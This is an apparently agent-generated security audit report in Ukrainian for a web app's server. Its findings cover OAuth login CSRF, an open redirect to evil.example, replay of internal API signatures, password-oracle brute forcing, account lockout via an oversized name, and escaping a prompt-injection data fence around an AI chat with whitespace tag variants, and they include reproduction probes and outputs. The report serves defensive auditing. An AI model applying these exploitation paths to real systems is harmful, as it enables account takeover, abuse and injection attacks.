grep: `process.env["NODE_ENV"] === "production"` у cors.ts:63, auth.ts:648/671, requireInternalIp.ts:187, security.ts:92; isDeployedProduction() лише в env.ts, betterAuthEnv.ts, ftuxDripMail.ts, authTransactionalMail.ts. security-comprehensive-2026-08-04 §1.2 (рядки 114 і 377) прямо рекомендував обгорнути localhost-origin-и в `isDeployedProduction()`, а реалізовано NODE_ENV-гейт. Запис SECURITY-20260804-1-2 у verification/findings.json має status open.
```

### [low] OAuth-колбек Silpo анонімний і state не прив'язаний до браузера: Silpo-токени жертви можуть потрапити в акаунт атакувальника

- **ID:** `server-static-redo/route-authz#5` · **Вердикт:** підтверджено · **Категорія:** `auth-session` · **Лейн:** Статика сервера · повтор route-authz
- **Стан:** відкрито
- **Серйозність від шукача:** medium (переоцінено верифікатором)
- **Де:** apps/server/src/routes/silpo.ts:582-592 (колбек до requireSession), silpo.ts:135-197 (callbackHandler: власника визначає лише state з БД)
- **Вплив:** Атакувальник отримує доступ до чеків і даних лояльності Silpo жертви, можливо й до операцій з кошиком (cart/apply), за умови що жертва погодиться на згоду в Silpo, наприклад за фішинговим посиланням на справжню сторінку Silpo.
- **Що зробити:** На /api/silpo/connect ставити HttpOnly SameSite=Lax cookie з хешем state на API-хості (navigation top-level) і звіряти її в колбеку. Альтернатива: після колбека показувати підтвердження «підключити акаунт Silpo X до Sergeant-акаунта Y» в автентифікованій сесії.

**Докази:**

```text
silpo.ts:165-197: `const pending = await consumeAuthorizationState(state); ... const userId = pending.userId;`. Коментар стверджує, що підсунутий state прив'яже токени до того, хто його замовив, тобто до атакувальника. Це і є шкода у зворотному напрямку: атакувальник ініціює /connect, а згоду на сторінці Silpo дає жертва, тож токени Silpo жертви зберігаються в Sergeant-акаунті атакувальника. Cookie-прив'язки state до браузера, який почав флоу, немає.
```

**Відтворення:**

```text
Статичний аналіз. Локально Silpo не налаштовано (assertSilpoEnabled), тож живу перевірку не робив.
```

**Верифікатор:**

```text
Підтверджено в коді. GET /api/silpo/callback зареєстровано до requireSession (silpo.ts:582-592). callbackHandler визначає власника лише через consumeAuthorizationState(state) → pending.userId (165-197). Прив'язки state до браузера, який почав флоу, немає: ні cookie, ні звірки сесії. PKCE не допомагає, бо code_verifier зберігається на сервері разом зі state. Коментар у коді (191-196) розглядає лише класичний напрямок атаки і прямо визнає, що підсунутий state прив'яже токени до того, хто його замовив. Це і є атака: атакувальник отримує через /connect URL авторизації зі своїм state, а жертва дає згоду на справжній сторінці Сільпо. Тоді її Сільпо-токени зберігаються в Sergeant-акаунті атакувальника, разом з читанням чеків і записом у кошик (cart.ts applyCart, REPLACE). Severity знижено до low, бо зараз у проді це не експлуатується: SILPO_ENABLED за замовчуванням false (env.ts:353), а вмикання в проді — окремий ops-крок, який, судячи з плейбука enable-silpo-integration.md, ще не зроблено. Після ввімкнення це medium, а якщо Сільпо не показує повторного екрана згоди для вже авторизованого клієнта, то й вище.
```

**Додаткові докази верифікатора:**

```text
Код: apps/server/src/routes/silpo.ts:135-234 (callback), 571-592 (порядок mount), modules/silpo/oauth.ts:199-235 (state = 24 байти, userId+codeVerifier у silpo_oauth_state), 246-256 (consume), modules/silpo/cart.ts:402-440 (applyCart пише в кошик). Живу перевірку не робив: Silpo локально вимкнено. У docs/work/specs/audits цього напрямку немає. security-comprehensive-2026-08-04.md:320 стосується лише account-linking у Better Auth.
```

### [low] Плагін expo() відкриває в проді анонімний /api/auth/expo-authorization-proxy: open redirect плюс підписана state-кука зі значенням атакувальника

- **ID:** `server-static-redo/route-authz#7` · **Вердикт:** підтверджено · **Категорія:** `auth-session` · **Лейн:** Статика сервера · повтор route-authz
- **Стан:** відкрито
- **Де:** apps/server/src/auth.ts:617; node_modules/@better-auth/expo/dist/index.js:7-35 (v1.6.20)
- **Вплив:** Відкритий редирект з довіреного домену api.sergeant.com.ua (фішинг). Сервер підписує cookie state з довільним значенням, і це нівелює захист signed-state-cookie у Better Auth OAuth від login CSRF: жертву можна залогінити в акаунт атакувальника. Мобільний контур на паузі (ADR-0094), тож ендпоінт зараз не потрібен.
- **Що зробити:** Додати "/expo-authorization-proxy" у disabledPaths Better Auth або прибрати expo() з прод-конфігу до відновлення мобільного. Якщо він потрібен, обгорнути allowlist-ом хостів authorizationURL (accounts.google.com, appleid.apple.com).

**Докази:**

```text
GET /api/auth/expo-authorization-proxy?authorizationURL=https://example.org/landing?state=attacker-chosen-value → 302 Location: https://example.org/landing?state=attacker-chosen-value, Set-Cookie: better-auth.state=attacker-chosen-value.<HMAC>; Max-Age=300; HttpOnly; SameSite=Lax (probe5.out). Перевіряється лише https і те, що це не origin API.
```

**Відтворення:**

```text
node <scratch>/agents/server-static-redo-route-authz/probe5.mjs (останній рядок).
```

**Верифікатор:**

```text
@better-auth/expo 1.6.20 dist/index.js: /expo-authorization-proxy перевіряє лише https, відсутність '#' і те, що origin не дорівнює baseURL. Далі він ставить підписану куку state зі значенням параметра state з довільного URL (або непідписану oauth_state з параметра oauthState) і робить 302 на цей URL. Відтворено: відкритий редирект з API-домену плюс фіксація підписаної state-куки. Ланцюг login-CSRF за кодом здійсненний. Better Auth за замовчуванням використовує стратегію database (create-context.mjs:136), а parseGenericState у колбеку звіряє лише, що підписана кука state дорівнює state у запиті (dist/state.mjs). Атакувальник підставляє в браузер жертви state власного Google-флоу, після чого відкриває їй свій колбек з code і логінить її у свій акаунт. Наскрізно відтворити не вдалося: Google локально не налаштовано, а в проді це опційний env (GoogleSignInButton у вебі є). Low лишаю, бо жертва, скоріше за все, помітить чужий порожній акаунт. Плагін не потрібен для вебу, а мобільний контур на паузі (ADR-0094).
```

**Додаткові докази верифікатора:**

```text
v7.mjs: authorizationURL=https://evil.example/phish?state=XYZ → 302 Location на evil.example і Set-Cookie better-auth.state=XYZ.<HMAC>; без state → 400; http:// → 400. Варіант oauthState=ATTACKER → 302 і Set-Cookie better-auth.oauth_state=ATTACKER; Max-Age=600. У auth.ts немає disabledPaths і налаштування storeStateStrategy. У docs/work/specs/audits expo-authorization-proxy не згадано.
```

### [low] /api/internal/* у проді тримається на одному статичному bearer; IP-allowlist і HMAC опційні, а HMAC має дефекти, через які його непрактично вмикати

- **ID:** `server-static-redo/route-authz#8` · **Вердикт:** підтверджено · **Категорія:** `authz` · **Лейн:** Статика сервера · повтор route-authz
- **Стан:** відкрито
- **Уже відстежується:** docs/work/specs/audits/ai-pipeline-2026-08-05.md
- **Де:** apps/server/src/routes/internal/index.ts:65-105; apps/server/src/env/env.ts:246-252 (INTERNAL_ALLOWED_IPS, порожньо = шар не монтується навіть у prod), 475-477, 1023-1035 (лише warning); apps/server/src/http/verifyWebhookSignature.ts:107-115; bodySizePolicy.ts:190-196, 272-287
- **Вплив:** Витік одного INTERNAL_API_KEY (логи CI, env-скриншот) дає видачу Pro будь-кому, вивантаження email-ів користувачів і реплей вебхуків з будь-якої точки інтернету. Другий фактор (HMAC) фактично не можна увімкнути без поломки GET-маршрутів.
- **Що зробити:** Розмонтувати внутрішні маршрути без живих викликачів. У проді вимагати INTERNAL_ALLOWED_IPS і WEBHOOK_HMAC_SECRET (throw в assertStartupEnv). Включити в підпис метод і шлях, додати nonce або одноразовість. Для запитів без тіла ставити req.rawBody = Buffer.alloc(0).

**Докази:**

```text
Bearer fail-closed (503 без INTERNAL_API_KEY, constant-time), це коректно. Проте IP-шар і HMAC при старті прода не вимагаються. HMAC = HMAC(ts + "." + rawBody) без методу і шляху, без nonce: підпис {} для одного ендпоінта валідний для іншого протягом 300 с. rawBody заповнює лише express.json, коли є тіло. Перевірено (bodyparser-get.mjs): GET без тіла → rawBodyDefined:false. Тож з увімкненим секретом GET /api/internal/{ai-usage,prompts/:ns/:slug,users/cohort,debug-window/status} завжди дають 401 raw_body_unavailable. Викликачі (n8n ADR-0090, OpenClaw ADR-0075) виведені з експлуатації, а маршрути billing/upgrade (видача Pro), users/cohort (email і ім'я до 500 користувачів), webhook-events/replay, debug-window/enable лишаються змонтованими.
```

**Відтворення:**

```text
Статичний аналіз + node <scratch>/agents/server-static-redo-route-authz/bodyparser-get.mjs; живі path-варіанти /api/internal (регістр, //, /v1/, ./) дають 503 від guard-а (probe1.out).
```

**Верифікатор:**

```text
Код справді такий, як описано. routes/internal/index.ts:65-105: IP-шар монтується лише за непорожнього INTERNAL_ALLOWED_IPS. Bearer fail-closed, constant-time. verifyWebhookSignature робить no-op без WEBHOOK_HMAC_SECRET, а assertStartupEnv (env.ts:1027-1035) лише попереджає. Підпис = HMAC(ts + '.' + rawBody), без методу, шляху і nonce (verifyWebhookSignature.ts:111-115). rawBody заповнює лише verify-колбек express.json (bodySizePolicy.ts:274-281), а він для GET без тіла не викликається. Коментар у коді (рядки 103-106) помилково припускає, що для GET буде порожній Buffer. Користь двох інших шарів у проді залежить від env, якого з репо не видно. Уточнення: формулювання «GET завжди 401» перебільшене. Клієнт, що шле GET з `Content-Type: application/json` і `Content-Length: 0`, отримує порожній rawBody і проходить. Звичайний fetch/undici GET без тіла справді отримує 401 raw_body_unavailable. Є і додатковий аргумент на користь тези «HMAC непрактично вмикати»: єдині живі викликачі в репо, scripts/replay-webhook.mjs і scripts/replay-dlq.mjs, не підписують запитів узагалі. З секретом і дефолтним REQUIRED=true вони отримають 401 missing_signature. Severity low правильна: для будь-якої експлуатації спершу потрібен витік INTERNAL_API_KEY. Сама поза «тільки bearer» уже відома як B27, нові тут три дефекти HMAC: GET без тіла, відсутність прив'язки до шляху, непідписані скрипти.
```

**Додаткові докази верифікатора:**

```text
Відтворено на справжніх applyBodySizePolicy і verifyWebhookSignature (node --import tsx <scratch>/agents/verify-server-static-redo-route-authz/hmac-real.mts, секрет задано, required=true): `GET signed empty, no CT -> 401 reason raw_body_unavailable`; `fetch() GET signed empty -> 401 raw_body_unavailable`; `GET signed empty, CT json CL0 -> 200` (обхідний шлях); `POST {} з підписом, узятим для іншого ендпоінта, на /api/internal/billing/downgrade -> 200` (міжендпоінтний replay у вікні 300 с). bp.mjs: `GET no body rawBodyDefined:false; GET CT json CL0 rawBodyDefined:true len 0; POST no content-type rawBodyDefined:false`. grep 'Signature' у scripts/replay-*.mjs нічого не знаходить. users.ts:17-48 віддає id/email/name/createdAt до 500 рядків; billing.ts:31 вставляє plan 'pro' для будь-якого userId.
```

### [low] Екранування огорожі &lt;user_data&gt;/&lt;tool_output&gt; ловить лише точний закривальний тег: варіанти з пробілом не екрануються

- **ID:** `server-static/ai-layer#9` · **Вердикт:** підтверджено · **Категорія:** `injection` · **Лейн:** Статика сервера
- **Стан:** відкрито
- **Де:** apps/server/src/modules/chat/toolOutputWrapping.ts:98-102, 116-118; apps/web/src/core/lib/hubChatContext/finance.ts:187-189
- **Вплив:** Defense-in-depth: сторонній текст може синтаксично «закрити» огорожу даних і подати інструкції поза нею; у поєднанні з reversible-інструментами без підтвердження (hide_transaction, change_category, set_budget_limit тощо) це полегшує непряму prompt-injection.
- **Що зробити:** Екранувати будь-які варіанти `&lt;\s*/\s*user_data\s*&gt;` / `&lt;\s*/\s*tool_output\s*&gt;` (і відкривальні теги теж), або замінювати `&lt;`/`&gt;` у недовірених даних на ентіті повністю.

**Докази:**

```text
`s.replace(/<\/user_data>/gi, ...)` і `/<\/tool_output>/gi`. Запуск wrapAndScanUserContext: `"a</user_data>b"` -> екрановано, але `"a</user_data >b"` -> `<user_data>a</user_data >b</user_data>`, так само `</ user_data>` і `</user_data\n>`. У огорожу потрапляє текст третіх сторін: опис банківської операції (`${t.description}` у блоці [Останні операції]) -- назва мерчанта/відправника, яку контролює не користувач.
```

**Відтворення:**

```text
cd apps/server && node --import tsx <scratch>/agents/server-static-ai-layer/healthgate.mts (секція 'fence escape variants').
```

**Верифікатор:**

```text
Reproduced. escapeUserDataClose and escapeToolOutputClose match only the exact literal '</user_data>' and '</tool_output>' (with the i flag). Variants with whitespace or a newline pass through unescaped and visually close the fence. The prior audit (ai-pipeline-2026-08-05 B21) already established that the Monobank t.description reaching the [Останні операції] context block is third-party-controlled. Mitigations that limit impact: DATA_FENCE_RULE in SYSTEM_PREFIX. remember, create_transaction and export_module_data now require confirmation (B21 closed). The budget tools have undo (B39). The fence was always a soft layer, and an attacker can also place instructions inside the fence without closing it. So this is a defense-in-depth gap, not a direct exploit. Prior B8 dealt only with the escape form (zero-width vs entity), not with whitespace variants.
```

**Додаткові докази верифікатора:**

```text
Script <scratch>/agents/verify-server-static-ai-layer/fence-v3.mts output: "a</user_data>b" => "<user_data>a&lt;/user_data&gt;b</user_data>" (escaped); "a</user_data >b" => "<user_data>a</user_data >b</user_data>"; "a</ user_data>b" => unescaped; "a</user_data\n>b" => unescaped; tool_output: "q</tool_output >evil" => "<tool_output tool=\"unknown\">q</tool_output >evil</tool_output>". Code: toolOutputWrapping.ts:98-102, 116-118.
```

### [low] Сирий session token віддається JS (get-session, list-sessions з токенами всіх пристроїв) і приймається як Bearer без підпису

- **ID:** `server-static/auth-session#10` · **Вердикт:** підтверджено · **Категорія:** `auth-session` · **Лейн:** Статика сервера
- **Стан:** відкрито
- **Уже відстежується:** docs/work/specs/audits/security-comprehensive-2026-08-04.md
- **Де:** apps/server/src/auth.ts:617 (`bearer()` без `requireSignature`); node_modules/better-auth/dist/plugins/bearer/index.mjs:32-37; node_modules/better-auth/dist/api/routes/session.mjs:17-260, 371+ (token у відповіді)
- **Вплив:** HttpOnly-кука нічого не дає: будь-який XSS на веб-origin читає токени поточної і всіх інших сесій та використовує їх звідки завгодно як Bearer до 7 днів (з rolling refresh — довше).
- **Що зробити:** `bearer({ requireSignature: true })`; вирізати `token` з відповідей get-session/list-sessions для cookie-клієнтів (hooks.after) — веб для revoke може використовувати id; Bearer дозволяти лише нативній оболонці.

**Докази:**

```text
probe2: GET /api/auth/get-session → session keys [expiresAt, token, createdAt, ...], token present: true; GET /api/auth/list-sessions → count=1 tokensExposed=1; GET /api/me без cookie з `Authorization: Bearer <raw token>` → 200 {"user":{...}}.
```

**Відтворення:**

```text
node <scratch>/agents/server-static-auth-session/probe2.mjs (кроки 1-3).
```

**Верифікатор:**

```text
Відтворено. GET /api/auth/get-session віддає session.token, GET /api/auth/list-sessions віддає token кожної сесії. Сирий непідписаний токен у `Authorization: Bearer` без кукі дає 200 на /api/me, бо `bearer()` без requireSignature (auth.ts:617) сам підписує сирий токен секретом (plugins/bearer/index.mjs:32-37). Отже HttpOnly-кука від крадіжки через XSS не захищає. Чому low, а не вище: CORS-ланцюг з аудиту 2026-08-04 §1.2 (localhost → list-sessions) уже закрито NODE_ENV-гейтом (cors.ts:33-44), тож потрібен XSS на веб-origin, а CSP прода строгий (script-src 'self' без unsafe-inline, vercel.json). Застереження до рекомендації: одного `requireSignature: true` недостатньо. Bearer-плагін у after-hook кладе ПІДПИСАНИЙ токен у заголовок `set-auth-token` і додає його в Access-Control-Expose-Headers на кожну відповідь, що переставляє session-куку (напр. update-user), тож XSS прочитає підписаний токен поточної сесії і так. requireSignature знешкодить лише сирі токени з get-session/list-sessions, зокрема токени інших пристроїв. Capacitor-оболонка бере підписаний set-auth-token (authClient.ts:48-54), тож з requireSignature сумісна. Вирізати token з list-sessions без переробки вебу не вийде: SessionsSection.tsx:181,297 відкликає сесію через `revokeSession({ token })`.
```

**Додаткові докази верифікатора:**

```text
v1.log: #10.1 get-session 200, token present: true; #10.2 list-sessions count 1, withToken 1; #10.3 GET /api/me з сирим Bearer без кукі → 200 {"user":{...}}; без кукі і без bearer → 401; #10.4 POST /api/auth/update-user → 200, заголовок set-auth-token присутній (підписаний, з крапкою), access-control-expose-headers: set-auth-token.
```

### [low] Вбудований лімітер Better Auth ключується на сирому X-Forwarded-For, а не на `req.ip` Express

- **ID:** `server-static/auth-session#12` · **Вердикт:** підтверджено · **Категорія:** `config` · **Лейн:** Статика сервера
- **Стан:** відкрито
- **Де:** apps/server/src/auth.ts:282-619 (немає `rateLimit`/`advanced.ipAddress`); node_modules/@better-auth/core/dist/utils/ip.mjs:162-216 (без trustedProxies довіряє лише одно-значному XFF, інакше null); node_modules/better-auth/dist/api/rate-limiter/index.mjs:275-287 (null → спільний бакет `no-trusted-ip|&lt;path&gt;`); context/create-context.mjs:171 (увімкнено лише при NODE_ENV=production, storage memory)
- **Вплив:** Можливий глобальний DoS входу/зміни пароля від одного джерела (3 запити/10 с) або марний ліміт; поведінка не задокументована і відрізняється від app-лімітера (пов'язано з відомою знахідкою 1.1 аудиту 2026-08-04).
- **Що зробити:** Явно задати `advanced.ipAddress.trustedProxies`/`ipAddressHeaders` відповідно до фактичного ланцюга проксі або вимкнути вбудований лімітер (`rateLimit.enabled: false`) і покрити всі чутливі шляхи власним лімітером.

**Докази:**

```text
getIPFromHeader: `if (forwardedIps.length !== 1) return null` коли trustedProxies порожні; resolveRateLimitConfig: `createRateLimitKey(ip ?? NO_TRUSTED_IP_KEY, path)`. Прод-ланцюг Vercel Edge middleware (apps/web/middleware.ts копіює всі заголовки) → Traefik → Express. Залежно від того, чи Traefik дописує XFF, бакет або спільний на весь сайт (3 спроби/10 с на /sign-in, /change-password; 3/60 с на reset/verification), або на egress-IP Vercel. Цей самий XFF іде в session.ipAddress для drift-детектора, а наш лімітер і drift беруть `req.ip` — два різні джерела IP.
```

**Відтворення:**

```text
Статично; у прод-логах шукати warn «Rate limiting could not determine a client IP and is falling back to a single shared per-path bucket».
```

**Верифікатор:**

```text
Факт у коді підтверджено. В auth.ts немає `rateLimit`, `secondaryStorage` чи `advanced.ipAddress` (grep порожній; advanced лише з cookie-опціями, :618). Тому вбудований лімітер BA вмикається в production з пам'яттю процесу як сховищем (create-context.mjs:169-175). Ключ він бере з getIp, який без trustedProxies довіряє лише одно-значному X-Forwarded-For, інакше повертає null (core/utils/ip.mjs:174-208). При null запит падає в спільний бакет `no-trusted-ip|<path>` (rate-limiter/index.mjs:275-287). Express-лімітер і drift-детектор беруть `req.ip` за trust proxy (auth.ts:749), тобто це два різні джерела IP. Коментар H3 в auth.ts:543-547 («BA резолвив IP з урахуванням app.set('trust proxy')») хибний. Прод-ланцюг Vercel Edge (middleware.ts:61 копіює всі заголовки) → Traefik → Express жодній конфігурації не дає ключ на рівні клієнта: або XFF із двох значень і спільний бакет на весь сайт, або egress-IP Vercel. Саме обмеження 429 у dev не відтворюється, бо лімітер BA там вимкнений. Наскільки реальна шкода в проді, залежить від конфігурації Traefik, яку не виміряно, тому severity лишаю low.
```

**Додаткові докази верифікатора:**

```text
verify-server-static-auth-session/v2.mjs + v2.log. Sign-in з `X-Forwarded-For: 203.0.113.7, 198.51.100.9` → session.ipAddress порожній (BA не зміг визначити IP), хоча Express із trust proxy 1 бачить 198.51.100.9. Sign-in з `X-Forwarded-For: 192.0.2.55` → session.ipAddress 192.0.2.0/24. У локальній БД 201 із 207 сесій мають порожній ipAddress. Якщо в проді XFF приходить із кількох значень, drift-детектор H3 теж сліпий на IP, бо порівнює stored null. Корінь пов'язаний із §1.1 у security-comprehensive-2026-08-04.md (ідентифікація IP через Vercel-проксі не виміряна, ADR-0074 «TRUST_PROXY калібрування під Traefik TBD»), але там ідеться про app-лімітер, а не про вбудований лімітер BA і не про session.ipAddress.
```

### [low] `DELETE /api/me` для OAuth-акаунтів не вимагає ні пароля, ні свіжої сесії (регрес відносно Better Auth delete-user)

- **ID:** `server-static/auth-session#5` · **Вердикт:** підтверджено · **Категорія:** `auth-session` · **Лейн:** Статика сервера
- **Стан:** відкрито
- **Серйозність від шукача:** medium (переоцінено верифікатором)
- **Де:** apps/server/src/modules/me/verifyAccountPassword.ts:49 (`if (!credential || !hash) return { ok: true }`); apps/server/src/routes/me.ts:272-296; apps/server/src/http/requireSession.ts:108-116 + auth.ts:809-811 (requireFreshSession лише оминає cookie-кеш); node_modules/better-auth/dist/api/routes/update-user.mjs:304-307 (оригінал: без пароля → вимога freshAge 24 год)
- **Вплив:** Украдена сесія OAuth-користувача без повторної автентифікації запускає видалення акаунта і безповоротно скасовує платну підписку; користувача викидає з усіх пристроїв.
- **Що зробити:** Для акаунтів без credential вимагати свіжу сесію (session.createdAt &lt; freshAge, як у Better Auth) або повторний OAuth-вхід перед DELETE /api/me; перейменувати/задокументувати requireFreshSession як «uncached», щоб не створювати хибного відчуття захисту.

**Докази:**

```text
verifyAccountPassword.ts коментар: «такі акаунти захищає вимога свіжої сесії на роуті». Але `requireFreshSession()` = `getSessionUser(req, { disableCookieCache: true })` — перевіряє лише, що сесія є в БД, вік (`session.createdAt`) не дивиться. Better Auth delete-user, який цей роут замінив: `if (!ctx.body.password && freshAge !== 0) { if (Date.now() - createdAt >= freshAge) throw SESSION_EXPIRED }`. requestAccountDeletion (dataRights.ts:537-604) одразу кличе notifyProvidersCancel і ставить subscriptions.status='canceled', а restore підписку не повертає.
```

**Відтворення:**

```text
Статично (Google/Apple локально не налаштовані). Для акаунта лише з Google: будь-яка валідна сесія (навіть 6-денна) → DELETE /api/me з X-Requested-With і порожнім тілом → 200, мітка видалення + скасування підписки.
```

**Верифікатор:**

```text
Підтверджено в коді без сумнівів, наживо не перевірити: локально немає OAuth-only юзера, а писати в БД не можна. `verifyAccountPassword` (modules/me/verifyAccountPassword.ts:49) для акаунта без credential повертає `{ok:true}`. `requireFreshSession()` = `getSessionUser(req,{disableCookieCache:true})` (auth.ts:809-811, requireSession.ts:108-116), тобто він лише обходить кеш і `session.createdAt` не перевіряє. `freshAge` у репо не налаштований і ніде не використовується. Коментар у verifyAccountPassword.ts («такі акаунти захищає вимога свіжої сесії на роуті») і задекларована ціль у me.ts:283-285 («вкрадена сесія могла б запустити 30-денний відлік») для OAuth-акаунтів не виконуються. Better Auth delete-user вимагав freshAge 24 год (update-user.mjs:304-307). Severity знижено до low: прибавка шкоди мала. Вкрадена сесія і так може скасувати підписку через `POST /api/billing/cancel` (requireSession, навіть кешований) і стерти дані звичайним CRUD, а мітка видалення відновлювана 30 днів.
```

**Додаткові докази верифікатора:**

```text
routes/billing.ts:243-249: `/api/billing/cancel` = requireSession() + 10/год, без пароля і свіжості, тож незворотне скасування підписки доступне вкраденій сесії і без DELETE /api/me. grep freshAge по apps/server/src нічого не дав. dataRights.ts:575 гасить усі сесії, 577-585 ставить subscriptions.status='canceled'.
```

### [low] Оракули пароля для власника сесії без app-ліміту: `/api/auth/verify-password` і `DELETE /api/me`

- **ID:** `server-static/auth-session#6` · **Вердикт:** підтверджено · **Категорія:** `auth-session` · **Лейн:** Статика сервера
- **Стан:** відкрито
- **Серйозність від шукача:** medium (переоцінено верифікатором)
- **Де:** node_modules/better-auth/dist/api/routes/password.mjs:166-192 (`/verify-password`, metadata.scope:"server" ≠ SERVER_ONLY → зареєстрований у HTTP-роутері, better-call/dist/router.mjs:23); apps/server/src/routes/me.ts:272-296 (DELETE /api/me без rateLimitExpress); apps/server/src/http/authMiddleware.ts:31-37 (sensitive-список не містить verify-password/change-password)
- **Вплив:** З украденою сесією можна перебирати пароль (до ~36k спроб/год на IP через verify-password, без обмежень через DELETE /api/me) і отримати відкритий пароль: стійкий доступ після відкликання сесій і повторне використання на інших сервісах.
- **Що зробити:** Вимкнути `/verify-password` через `disabledPaths` (вебом не використовується) або додати його, `/change-password` і `DELETE /api/me` до per-user лімітера (напр. 5/15 хв на користувача) з алертом на серію INVALID_PASSWORD.

**Докази:**

```text
Наживо (probe2.log):
4a. verify-password wrong: 400 INVALID_PASSWORD; 4b. correct: 200 {"status":true}
4c. 12 wrong verify-password поспіль: 400×12 (жодного 429)
4d. 8 wrong DELETE /api/me поспіль: 400×8 (жодного 429)
У проді діє лише вбудований лімітер Better Auth (in-memory, лише NODE_ENV=production): verify-password під дефолтним правилом 100/10 с на IP; DELETE /api/me — наш роут, ліміту немає взагалі.
```

**Відтворення:**

```text
node <scratch>/agents/server-static-auth-session/probe2.mjs (кроки 4a–4d).
```

**Верифікатор:**

```text
Відтворено наживо. `/verify-password` має `metadata.scope:"server"`, а не `SERVER_ONLY`, тому better-call router (router.mjs:23) реєструє його в HTTP. Endpoint працює через `sensitiveSessionMiddleware` і правильний пароль від неправильного відрізняє (200 проти 400). `DELETE /api/me` (me.ts:272-296) app-лімітера не має, `authSensitiveRateLimit` verify-password і change-password не покриває. У проді діє лише вбудований in-memory лімітер Better Auth (enabled при isProduction): 100/10 с на IP для verify-password і 3/10 с для change-password (rate-limiter/index.mjs:370-383). Severity знижено до low. Потрібна вже вкрадена жива сесія і слабкий пароль (мінімум 10 символів), а `change-password` сам по собі вже є оракулом зі стелею 3/10 с на IP. Це defense-in-depth.
```

**Додаткові докази верифікатора:**

```text
node <scratch>/agents/verify-server-static-auth-session/v4-misc.mjs: verify-password wrong 400, correct 200; 15× wrong verify-password: 400×15 (жодного 429); 10× wrong DELETE /api/me: 400×10, deletion_requested_at лишився NULL. Кожна спроба коштує близько 120-180 мс scrypt (node:crypto у libuv threadpool, 4 потоки за замовчуванням). Тож необмежений DELETE /api/me від будь-якого автентифікованого юзера ще й може насичувати threadpool і гальмувати чужі логіни. Це окремий DoS-кут, його я не навантажував.
```

### [low] Необмежене `name` роздуває session_data-куку до 33 КБ → кожен запит 431, акаунт заблоковано назавжди

- **ID:** `server-static/auth-session#7` · **Вердикт:** підтверджено · **Категорія:** `auth-session` · **Лейн:** Статика сервера
- **Стан:** відкрито
- **Серйозність від шукача:** medium (переоцінено верифікатором)
- **Де:** apps/server/src/auth.ts:449-540 (databaseHooks: sanitizeUserImage чистить лише image); apps/server/src/auth/sanitizeUserImage.ts; node_modules/better-auth/dist/api/routes/update-user.mjs:12-73 і sign-up.mjs (name без maxLength); cookies/index.mjs:70-107 (увесь user у cookie-кеші)
- **Вплив:** Той самий клас інциденту, що 2026-05-02 з image (504 на логіні), але через name: власник (або будь-хто з украденою сесією/XSS) одним запитом робить акаунт непридатним без самосервісного відновлення; за Vercel/Traefik великий Set-Cookie ще й рве відповіді проксі.
- **Що зробити:** Обмежити name (напр. 100 символів) у databaseHooks.user.create/update.before поряд із sanitizeUserImage і на рівні Zod для sign-up/update-user; почистити наявні довгі імена; розглянути `cookieCache.strategy` без user-полів або виключення name з кешу.

**Докази:**

```text
probe2: POST /api/auth/update-user {name: "Я"×12000} → відповідь з заголовками понад ліміт undici (HeadersOverflowError); у БД name_bytes=24000.
probe3 (sign-in того ж користувача): 200, 10 Set-Cookie, 33661 байт; Cookie у відповідь 33226 байт →
GET /api/me → 431
GET /api/auth/get-session → 431
Тобто після будь-якого входу всі наступні запити браузера відбиваються 431, а виправити name можна лише запитом, який теж отримає 431.
```

**Відтворення:**

```text
node <scratch>/agents/server-static-auth-session/probe2.mjs (крок 7) і probe3.mjs. Користувач ssa-probe2/audit_pool67 зламаний навмисно.
```

**Верифікатор:**

```text
Відтворено наживо. `databaseHooks.user.{create,update}.before` чистить лише `image` (sanitizeUserImage), а Better Auth `update-user` приймає `name` без maxLength. Увесь user потрапляє в `session_data` (setCookieCache), і при 24 КБ імені Cookie-заголовок виходить 33 КБ, що більше за 16 КБ ліміт заголовків Node, тож усі запити отримують 431, разом із самовиправленням і sign-out. Cookie-кеш живе 5 хв, але веб на старті викликає `/api/auth/get-session`, а він у DB-гілці знову ставить роздутий кеш (session.mjs:247), тож у браузері цикл повторюється. Severity знижено до low: UI обмежує name 80 символами (PersonalInfoSection.tsx:27), тобто випадково через інтерфейс так не зламати. Стан ставиться лише власною сесією акаунта (сам власник через API, або XSS чи вкрадена сесія, які і так дають більше). Шкоди між користувачами немає. Це defense-in-depth, а не medium.
```

**Додаткові докази верифікатора:**

```text
node <scratch>/agents/verify-server-static-auth-session/v4-misc.mjs: update-user {name:'Я'×12000} → відповідь переповнює undici-заголовки (HEADERS_OVERFLOW), DB octet_length(name)=24000; свіжий sign-in → 200, 10 Set-Cookie, 33660 байт; Cookie 33225 байт → GET /api/me 431, GET get-session 431, POST update-user {name:'Fix'} 431, POST sign-out 431. Pool-юзер audit_pool129 (тепер email vssa_rebound_1790904830695@example.com) зламано навмисно.
```

### [low] Листові ендпоінти поза app-лімітером: change-email шле лист на довільну адресу за кожен виклик, send-verification-email анонімний

- **ID:** `server-static/auth-session#8` · **Вердикт:** підтверджено · **Категорія:** `auth-session` · **Лейн:** Статика сервера
- **Стан:** відкрито
- **Де:** apps/server/src/http/authMiddleware.ts:31-37 (список sensitive без change-email/send-verification-email); node_modules/better-auth/dist/api/routes/update-user.mjs:430-447; email-verification.mjs:36-117; api/rate-limiter/index.mjs:370-384 (вбудовані правила 3/10с і 3/60с на IP, лише в production, in-memory)
- **Вплив:** Одноразовий акаунт стає ретранслятором листів «підтверди email» на будь-які адреси з нашого домену Resend; з ротацією IP обмеження немає. Скарги на спам б'ють по репутації домену і доставлюваності скидань пароля для всіх.
- **Що зробити:** Додати `/change-email` і `/send-verification-email` до authSensitiveRateLimit і per-account/per-user бакета (напр. 3/год на користувача і на цільову адресу); у гілці без верифікації не дозволяти більше N змін email на добу.

**Докази:**

```text
probe7: непідтверджений акаунт, 6× POST /api/auth/change-email {newEmail: ssa_thirdparty_i_...@example.org} → 200,200,200,200,200,200; у server.log 6 подій auth_transactional_email kind=email_verification (по одній на кожну сторонню адресу).
probe2 крок 5: 7× анонімний POST /api/auth/send-verification-email {email: <непідтверджений>} → 200×7.
```

**Відтворення:**

```text
node <scratch>/agents/server-static-auth-session/probe7.mjs; probe2.mjs крок 5.
```

**Верифікатор:**

```text
